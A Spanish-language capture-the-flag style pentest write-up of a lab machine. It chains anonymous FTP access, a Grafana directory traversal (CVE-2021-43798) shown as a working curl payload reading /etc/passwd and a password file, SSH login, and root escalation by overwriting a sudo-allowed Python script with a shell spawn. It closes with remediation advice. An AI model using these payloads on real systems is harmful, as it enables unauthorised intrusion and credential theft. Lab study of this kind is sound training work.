# 🧾 INFORMACIÓN GENERAL

```text
┌────────────────────────────────────────────────────────────────────────────┐
│                          INFORMACIÓN GENERAL                               │
├────────────────────────────────────────────────────────────────────────────┤
│ Título del Pentest / Máquina : [move]                                      │
│ Autor / Tester             : [fybersec]                                    │
│ Fecha de realización       : [**/04/2026]                                  │
│ Alcance del laboratorio    : [Máquinas / servicios / red]                  │
│ Objetivo del pentest       : Evaluar seguridad e identificar               │
│                              vulnerabilidades                              │
│ Notas adicionales          : [Laboratorio controlado]                      │
└────────────────────────────────────────────────────────────────────────────┘
```
# 🧠 Resumen Ejecutivo
Se identificó una mala configuración en servicios expuestos que permitió:

* Acceso anónimo a FTP 📂

* Exposición de archivos sensibles (Keepass DB) 🔐

* Vulnerabilidad crítica en Grafana (Path Traversal / LFI) 💣

* Lectura de archivos internos (/tmp/pass.txt)

* Acceso por SSH con credenciales válidas

* Escalada de privilegios mediante mala configuración de sudo

➡️ Resultado: Compromiso total del sistema (root)

Nivel de criticidad: 🔴 ALTO

# 🌐Reconocimiento
```
❯ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.125 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.073 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1031ms
rtt min/avg/max/mdev = 0.073/0.099/0.125/0.026 ms
```
ping envía paquetes ICMP para verificar si el host está activo.
El parámetro -c 2 limita el envío a 2 paquetes para no generar tráfico innecesario.

El host responde correctamente, lo que confirma conectividad.
Además, el TTL=64 sugiere que probablemente se trate de un sistema Linux, lo cual ya nos da contexto sobre posibles rutas de ataque y comportamiento del sistema.
# 🔍Escaneo de Nmap
```
❯ sudo nmap -sS -n -Pn --min-rate 5000 -p- --open 172.17.0.2 -oN allports
```
Se realiza un escaneo completo de los 65535 puertos TCP para no perder ningún servicio expuesto.

-sS → escaneo SYN (no completa el handshake TCP, por eso es más rápido y menos detectable)  
-n → evita resolución DNS  
-Pn → omite descubrimiento de host  
-p- → todos los puertos  
--open → muestra solo abiertos  
--min-rate 5000 → fuerza velocidad alta 
### Resultado
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-27 08:05 -0400
Nmap scan report for 172.17.0.2
Host is up (0.000011s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 5A:06:46:D5:D4:E9 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds
```

# 🧪Enumeración de servicios
```
❯ sudo nmap -sCV -n -Pn -p21,22,80,3000 -oN services.txt 172.17.0.2
```
-sC → ejecuta scripts de enumeración  
-sV → detecta versiones  

### Resultados importantes
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-27 08:08 -0400
Nmap scan report for 172.17.0.2
Host is up (0.000016s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    1 0        0            4096 Mar 29  2024 mantenimiento [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 9.6p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|   256 77:0b:34:36:87:0d:38:64:58:c0:6f:4e:cd:7a:3a:99 (ECDSA)
|_  256 1e:c6:b2:91:56:32:50:a5:03:45:f3:f7:32:ca:7b:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Debian))
|_http-server-header: Apache/2.4.58 (Debian)
|_http-title: Apache2 Debian Default Page: It works
3000/tcp open  http    Grafana http
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
MAC Address: 5A:06:46:D5:D4:E9 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeracion del servicio FTP
```
❯ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:user): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd mantenimiento
250 Directory successfully changed.
ftp> ls -l
229 Entering Extended Passive Mode (|||64582|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0            2021 Mar 29  2024 database.kdbx
226 Directory send OK.
ftp> get database.kdbx
local: database.kdbx remote: database.kdbx
229 Entering Extended Passive Mode (|||57104|)
150 Opening BINARY mode data connection for database.kdbx (2021 bytes).
100% |*****************************************************************************************************************|  2021       11.54 MiB/s    00:00 ETA
226 Transfer complete.
2021 bytes received in 00:00 (1.33 MiB/s)
ftp> exit
221 Goodbye.
❯ cat database.kdbx
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: database.kdbx   <BINARY>
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```
📌 Se identifica un archivo .kdbx (base de datos Keepass)

Esto sugiere:
- Posible almacenamiento de credenciales
- Vector de ataque mediante fuerza bruta

⚠️ Se decide NO atacarlo inicialmente porque:
- Alto costo computacional
- Existen vectores más rápidos (priorización ofensiva)


# 🌍Enumeración Web
La página por defecto no aporta información útil,
por lo que se procede a enumeración forzada (fuzzing).

```
❯ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -x php,txt,ccs,html -t 64
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,ccs,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 10701]
maintenance.html     (Status: 200) [Size: 63]

```
Al entrar al esa ruta > maintenance.html encontramos lo siguiente: Website under maintenance, access is in /tmp/pass.txt

Lo cual es una pista pero por el momento no tenemos como acceder a esa ruta interna entonces visualizamos el puerto 3000

```
❯ curl http://172.17.0.2:3000
<a href="/login">Found</a>.
```
Grafana es una plataforma de código abierto líder para la visualización y análisis de datos en tiempo real a través de aplicaciones web. Permite convertir métricas complejas (de bases de datos como Prometheus o InfluxDB) en gráficos, paneles (dashboards) interactivos y alertas, facilitando la monitorización de servidores, aplicaciones y redes.

Tenemos un login que muestra lo siguiente: 

<p align="center">
  <img src="https://raw.githubusercontent.com/fybersec/cybersecurity-labs/main/dockerlabs/Imagenes/Grafana.png" width="600">
</p>

Aqui podemos ver que muestra la version de grafana lo cual nos permite investigar si esa version tiene alguna vulnerabilidad y a su vez enontrar que trae por defecto User:admin Pass:admin Pero para este lab no sera necesario adentraste a grafana. Buscaremos en SEARCHSPLOIT esa version.


# Busqueda de payload-exploit
```
❯ searchsploit grafana 8.3.0
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                 | multiple/webapps/50581.py
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Se identifica vulnerabilidad:

🧨 CVE-2021-43798 → Directory Traversal / Arbitrary File Read

Impacto:
- Lectura de archivos del sistema
- Acceso a credenciales internas
- Escalada indirecta

Causa:
Grafana no valida correctamente rutas en plugins públicos,
permitiendo traversal con ../../

Lo traemos a la maquina:

❯ searchsploit -m multiple/webapps/50581.py

Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
File Type: Python script, ASCII text executable
Copied to: /home/user/50581.py

Al listarlo vemos esta parte del codigo la cual nos indica como trabaja este payload 

<p align="center">
  <img src="https://raw.githubusercontent.com/fybersec/cybersecurity-labs/main/dockerlabs/Imagenes/CODE.png" width="600">
</p>

Lo que hace es hacer una peticion web con las primeras rutas de uno de sus plugins y luego hace varios /.. para retroceder y al final poder listar lo que queramos, grafana al ver las primeras rutas ve que son veridicas y ya no se fija en lo demas que este llamando al final

# 🔓Uso del payload
Se valida vulnerabilidad leyendo /etc/passwd

Esto confirma:
✔️ LFI funcional
✔️ Control sobre lectura arbitraria

Manual:
```
❯ curl --path-as-is http://172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
grafana:x:103:105::/usr/share/grafana:/bin/false
fr*****:x:1000:1000::/home/fr****:/bin/bash
```
Automatica:
```
❯ python 50581.py -H http://172.17.0.2:3000/
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
grafana:x:103:105::/usr/share/grafana:/bin/false
fr*****:x:1000:1000::/home/fr****:/bin/bash
```
Se accede a:
/tmp/pass.txt
📌 Contenido:
t9sH76gp************

Esto confirma:
- Credenciales almacenadas en texto plano
- Mala práctica crítica
```
❯ python 50581.py -H http://172.17.0.2:3000/
Read file > /tmp/pass.txt
t9sH76gp************
```

# 🖥️ACCESO POR SSH
Ya tenemos un usuario que aparentemente puede usarse para autenticacion mediante el puerto ssh y su posible clave encontrada en la ruta dada al inicio: /tmp/pass.txt
```
❯ ssh fre***@172.17.0.2
Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
┌──(fr***㉿d7a3ed01aea9)-[~]
└─$sudo -l                                                                                                                                                   
Matching Defaults entries for fre**** on d7a3ed01aea9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User fre*** may run the following commands on d7a3ed01aea9:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
                       
```
Se identifica que el script es ejecutable como root y es modificable por el usuario,
lo que permite inyección de código y ejecución con privilegios elevados.

# 🚀 ESCALADA DE PRIVILEGIOS 
```
┌──(fr****㉿d7a3ed01aea9)-[~]
└─$ cd /opt                                                                                                                                                   
┌──(fr****㉿d7a3ed01aea9)-[/opt]
└─$ echo 'import os; os.system("/bin/bash")' > maintenance.py                                                                                                 
┌──(fr***㉿d7a3ed01aea9)-[/opt]
└─$ sudo -l
Matching Defaults entries for freddy on d7a3ed01aea9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
User fre*** may run the following commands on d7a3ed01aea9:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
┌──(fre***㉿d7a3ed01aea9)-[/opt]
└─$ sudo /usr/bin/python3 /opt/maintenance.py                                                                                                                 
┌──(root㉿d7a3ed01aea9)-[/opt]
└─# cd /root
┌──(root㉿d7a3ed01aea9)-[~]
└─# ls -l                                                                                                                                                     
total 0

```
## 🎯 Cadena de ataque

1. 🔍 Reconocimiento → host activo (Linux)
2. 🚪 Enumeración → FTP con acceso anónimo
3. 📂 Acceso a archivo sensible (Keepass DB)
4. 🌐 Enumeración web → descubrimiento de pista (/tmp/pass.txt)
5. 💣 Explotación Grafana (CVE-2021-43798)
6. 📄 Lectura de archivo interno → credenciales
7. 🔑 Acceso SSH como usuario válido
8. ⚙️ Enumeración interna → sudo mal configurado
9. 👑 Escalada de privilegios → root

➡️ Compromiso total del sistema

# 🛡️ Recomendaciones
- Deshabilitar acceso anónimo
🌐 Grafana
- Actualizar a versión parcheada
- Restringir acceso a /public/plugins
🔑 Credenciales
- No almacenar en texto plano
⚙️ Sudo
- Evitar NOPASSWD en scripts modificables
📂 Archivos sensibles
- Evitar ubicaciones públicas (/tmp)
🧠 General
- Auditorías periódicas








